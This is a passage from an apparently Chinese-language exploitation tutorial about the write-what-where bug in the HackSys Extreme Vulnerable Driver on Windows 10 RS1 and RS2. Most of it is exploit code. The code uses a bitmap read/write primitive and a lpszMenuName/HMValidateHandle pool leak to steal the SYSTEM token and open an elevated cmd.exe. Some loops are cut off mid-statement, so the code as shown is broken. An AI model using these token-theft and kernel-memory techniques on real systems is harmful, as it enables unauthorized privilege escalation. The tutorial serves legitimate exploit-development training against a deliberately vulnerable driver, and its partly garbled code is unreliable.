        NtQuerySystemInformation(SystemModuleInformation, moduleInfo, len, &len);
        LPCSTR lpkernelName = (LPCSTR)(moduleInfo->Module[0].FullPathName + moduleInfo->Module[0].OffsetToFileName);
        //printf("aaaaaa\n");
        printf("[+]kernel name is: %s\n", lpkernelName);
        LPVOID kernelBase = moduleInfo->Module[0].ImageBase;
        HMODULE hUserSpacekernel = LoadLibraryExA(lpkernelName, 0, 0);
        FARPROC pUserKernelSymbol = GetProcAddress(hUserSpacekernel, "PsInitialSystemProcess");
        FARPROC pLiveFunctionAddress = (FARPROC)((PUCHAR)pUserKernelSymbol - (PUCHAR)hUserSpacekernel + (PUCHAR)kernelBase);
        printf("pLiveFunctionAddress              ======%p\n", pLiveFunctionAddress);
        readOOB(hManagerbitmap, hWorkerbitmap, (DWORD64)pLiveFunctionAddress, &systemEprocessAddr, sizeof(DWORD64));
        readOOB(hManagerbitmap, hWorkerbitmap, (systemEprocessAddr + 0x358), &lpSystemToken, sizeof(DWORD64));
        printf("system eprocess addr: 0x%p\n", systemEprocessAddr);
        // _eprocess + 0x0f8 是 token   0x358
        // _eprocess + 0x0B8 是 ActiveProcessLinks.Flink    0x2f0
        // _eprocess + 0x0b4 是 processid   0x2e8
        // 获取当前进程的 _eprocess
        DWORD64 lpNextEPROCESS = 0;
        LPVOID lpCurrentPID = NULL;
        DWORD64 dwCurrentPID;
        LIST_ENTRY lpNextEntryAddreess = { 0 };
        DWORD64 currentProcessID = GetCurrentProcessId();   // 通过PID判断是否获取到当前进程的地址
        readOOB(hManagerbitmap, hWorkerbitmap, systemEprocessAddr + 0x2f0, &lpNextEntryAddreess, sizeof(LIST_ENTRY));
        do  // 根据PID是否找到当前进程 
        {
            // 获取下一个进程
            lpNextEPROCESS = (DWORD64)((PUCHAR)lpNextEntryAddreess.Flink - 0x2f0);
            // 获取PID
            readOOB(hManagerbitmap, hWorkerbitmap, lpNextEPROCESS + 0x2e8, &lpCurrentPID, sizeof(LPVOID));
            dwCurrentPID = LOWORD(lpCurrentPID);
            readOOB(hManagerbitmap, hWorkerbitmap, lpNextEPROCESS + 0x2f0, &lpNextEntryAddreess, sizeof(LIST_ENTRY));
        } while (dwCurrentPID != currentProcessID);
        DWORD64 currentTokenAddress = (DWORD64)lpNextEPROCESS + 0x358;
        writeOOB(hManagerbitmap, hWorkerbitmap, currentTokenAddress, lpSystemToken, sizeof(LPVOID));
        //system("whoami\n");
        CreateCmd();
        system("pause");
        CloseHandle(hManagerbitmap);
        CloseHandle(hWorkerbitmap);
        return 0;
    }
可以看到最后是成功了的.
最后我们总结一下RS1在WWW下的利用.  
1.创建两个bitmap对象  
2.利用 AcceleratorTables 间接获得pvScan0的地址(level up)  
3.用漏洞改掉bitmap对象中pvScan0的值  
4.替换Token  
还有个要注意的地方就是nSize的大小和 CreateBitmap
的参数有一个对应关系,关系不对的话也是不能成功的.因为我这里是直接用的别人的数据,没仔细研究过,不过后来这个坑让我在1709也就是RS3踩到了.后面我会讲我是怎么踩到坑以及如何解决的.如果你想了解更多的话,请[参考这里](https://paper.seebug.org/877/#bitmap)
## 0x05:RS2(win10_x64_1703)下的WWW
由前面的RS1下的WWW我们得知利用 AcceleratorTables
间接获得pvScan0的地址的绕过手段在RS2下被kill掉了.那么在RS2下我们的WWW漏洞又该如何利用呢?上图
通过图片我们可以看到我们能通过WNDCLASSEX.lpszMenuName泄露pvScan0的地址.那么什么是WNDCLASSEX.lpszMenuName呢?上图
[图片来源](https://www.whsgwl.net/blog/CVE-2018-8453_1.html#0x00)  
这是CVE-2018-8453中的一段代码.我们只需要关注我箭头所指向的内容就好.  
那么问题来了,我们怎么利用 WNDCLASSEX.lpszMenuName 泄露pvScan0的地址呢?  
这里我们通过设置lpszMenuName的大小,释放掉,然后创建bitmap对象,如果bitmap申请到了对应的pool,那么我们就间接获得了pvScan0的地址.这里我也是用的别人的数据.
            char buf[0x8f0];
            memset(buf, 0x41, 0x8f0);
            WNDCLASSEX wndclass = { 0x0 };
            wndclass.cbSize = sizeof(wndclass);
            wndclass.lpszClassName = TEXT("case");
            wndclass.lpszMenuName = buf;
            wndclass.lpfnWndProc = DefWindowProc;
            ......
            hbmp.hBmp = CreateBitmap(0x701, 2, 1, 8, Buff);
            hbmp.kAddr = curr;//这是leak的lpszMenuName地址,有个判断当前申请的是否是前一个申请的
            hbmp.pvScan0 = (PUCHAR)(curr + 0x50);
我们现在知道了我们怎么通过lpszMenuName找pvScan0的地址,那么问题来了,我们怎么获得lpszMenuName的地址呢?  
我们可以使用HMValidateHandle()函数,该函数有两个参数,参数1为传入的Windows
Object句柄,参数2为句柄属性,该函数会返回查找Windows
Object结构在用户态映射下的地址(用户态桌面堆).然后再通过一系列的偏移找到lpszMenuName的地址.  
其中HMValidateHandle(
)这个函数可以通过硬编码得到.硬编码的知识我不是很了解,不过我记得里有相关的内容,有兴趣的同学可以自己去了解下…  
其他的没什么好说的了.exp贴贴:
    #include
    #include
    typedef struct _hBmp
    {
        HBITMAP hBmp;
        DWORD64 kAddr;
        PUCHAR pvScan0;
    }HBMP, * PHBMP;
    typedef void* (NTAPI* lHMValidateHandle)(HWND h, int type);
    typedef struct _payload {
        PULONG_PTR what;
        PULONG_PTR where;
    } Payload, * PPayload;
    typedef enum _SYSTEM_INFORMATION_CLASS {
        SystemBasicInformation = 0,
        SystemPerformanceInformation = 2,
        SystemTimeOfDayInformation = 3,
        SystemProcessInformation = 5,
        SystemProcessorPerformanceInformation = 8,
        SystemModuleInformation = 11,
        SystemInterruptInformation = 23,
        SystemExceptionInformation = 33,
        SystemRegistryQuotaInformation = 37,
        SystemLookasideInformation = 45
    } SYSTEM_INFORMATION_CLASS;
    typedef NTSTATUS(NTAPI* _NtQuerySystemInformation)(
        SYSTEM_INFORMATION_CLASS SystemInformationClass,
        PVOID SystemInformation,
        ULONG SystemInformationLength,
        PULONG ReturnLength
        );
    typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY {
        HANDLE Section;
        PVOID MappedBase;
        PVOID ImageBase;
        ULONG ImageSize;
        ULONG Flags;
        USHORT LoadOrderIndex;
        USHORT InitOrderIndex;
        USHORT LoadCount;
        USHORT OffsetToFileName;
        UCHAR FullPathName[256];
    } SYSTEM_MODULE_INFORMATION_ENTRY, * PSYSTEM_MODULE_INFORMATION_ENTRY;
    typedef struct _SYSTEM_MODULE_INFORMATION {
        ULONG NumberOfModules;
        SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
    } SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;
    HANDLE hDevice = NULL;
    HBMP workerBmp;
    HBMP managerBmp;
    lHMValidateHandle pHmValidateHandle = NULL;
    DWORD64 UserKernelDesktopHeap = 0;
    DWORD64 kernelDesktopHeap = 0;
    DWORD64 ulClientDelta = 0;
    BOOL init()
    {
        printf("[+]Start to get HANDLE");
        // Get HANDLE
        hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",
            GENERIC_READ | GENERIC_WRITE,
            NULL,
            NULL,
            OPEN_EXISTING,
            NULL,
            NULL);
        if (hDevice == INVALID_HANDLE_VALUE || hDevice == NULL)
        {
            return FALSE;
        }
        printf(" => done!\n");
        return TRUE;
    }
    static VOID CreateCmd()
    {
        STARTUPINFO si = { sizeof(si) };
        PROCESS_INFORMATION pi = { 0 };
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_SHOW;
        WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
        BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);
        if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
    }
    BOOL FindHMValidateHandle() {
        HMODULE hUser32 = LoadLibraryA("user32.dll");
        if (hUser32 == NULL) {
            printf("Failed to load user32");
            return FALSE;
        }
        BYTE* pIsMenu = (BYTE*)GetProcAddress(hUser32, "IsMenu");
        if (pIsMenu == NULL) {
            printf("Failed to find location of exported function 'IsMenu' within user32.dll\n");
            return FALSE;
        }
        unsigned int uiHMValidateHandleOffset = 0;
        for (unsigned int i = 0; i  done!\n");
        printf("[+]Client Delta address is 0x%p\n", ulClientDelta);
        return 0;
    }
    DWORD64 leakWnd(HWND leakWnd)
    {
        /*
        *[+]Leak Wnd address
        */
        PDWORD64 buffer = (PDWORD64)UserKernelDesktopHeap;
        DWORD i = 0;
        while (1)
        {
            if (buffer[i] == (DWORD64)leakWnd)
            {
                printf("[+]Wnd address is 0x%p\n", (DWORD64)(buffer + i));
                return (DWORD64)(buffer + i);
            }
            i++;
        }
    }
    DWORD64 lpszMenuName(HWND hwnd)
    {
        leakBitmap();
        DWORD64 wndaddr = leakWnd(hwnd);
        DWORD64 kernelTagCls = *(PDWORD64)(wndaddr + 0xa8);
        DWORD64 lpszNamemenuAddr = *(PDWORD64)(kernelTagCls - ulClientDelta + 0x90);
        printf("[+]kernel address lpszMenuName at: 0x%p\n", lpszNamemenuAddr);
        return lpszNamemenuAddr;
    }
    HBMP leak()
    {
        HBMP hbmp = { 0x0 };
        DWORD64 curr = 0;
        DWORD64 prev = 1;
        /*
        *[+]Heap spray biu biu biu ~
        */
        for (int i = 0; i   %p", hbmp.pvScan0);
                return hbmp;
            }
            DestroyWindow(test);
            UnregisterClassA(wndclass.lpszClassName, NULL);
            prev = curr;
        }
        return hbmp;
    }
    typedef struct _WRITE_WHAT_WHERE {
        PULONG_PTR What;
        PULONG_PTR Where;
    } WRITE_WHAT_WHERE, * PWRITE_WHAT_WHERE;
    VOID Leak_Trigger()
    {
        /*
        *[+]Step1:Get HMValidateHandle address
        */
        BOOL bFound = FindHMValidateHandle();
        if (!bFound) {
            printf("Failed to locate HmValidateHandle, exiting\n");